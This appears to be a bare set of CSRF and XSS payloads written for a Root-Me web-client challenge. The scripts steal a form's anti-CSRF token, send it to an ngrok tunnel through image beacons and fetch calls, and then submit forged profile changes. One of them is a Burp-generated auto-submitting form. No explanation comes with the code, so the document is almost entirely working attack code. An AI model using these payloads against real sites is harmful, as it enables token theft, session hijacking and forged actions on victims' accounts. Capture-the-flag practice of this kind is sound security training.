<script>
  new Image().src = "https://dcd24d46d48f.ngrok-free.app/log?m=img";

  var form = document.getElementById("profile");

  var token = form.querySelector("input[name='token']").value;

  new Image().src = "https://dcd24d46d48f.ngrok-free.app/log?m=" + token ;

  form.querySelector("input[name='username']").value = "zz";
  form.querySelector("input[name='status']").checked = true;

  form.submit();
</script>

<script>
fetch("https://dcd24d46d48f.ngrok-free.app/log?token=a7a").catch(() => {});
</script>



<script>
        var url = "http://challenge01.root-me.org/web-client/ch23/?action=profile";
        var ajax = new XMLHttpRequest();
        ajax.open("GET", url, false);
        ajax.send();

        var regex = /.*<input.*id="token".*value="([a-f0-9]{32})".*\/>/g;
        token = regex.exec(ajax.response)[1];

        ajax = new XMLHttpRequest();
        ajax.open("POST", url);
        ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        ajax.send("username=zz&status=on&token=" + token);
</script>

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="username" value="zz" />
      <input type="hidden" name="status" value="on" />
      <input type="hidden" name="token" value="token" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      var realToken = document.querySelector("input[name='token']").value;
	    new Image().src = "https://dcd24d46d48f.ngrok-free.app/log?m=" + realToken ;

		document.getElementById("token").value = realToken;
      document.forms[0].submit();
    </script>
  </body>
</html>
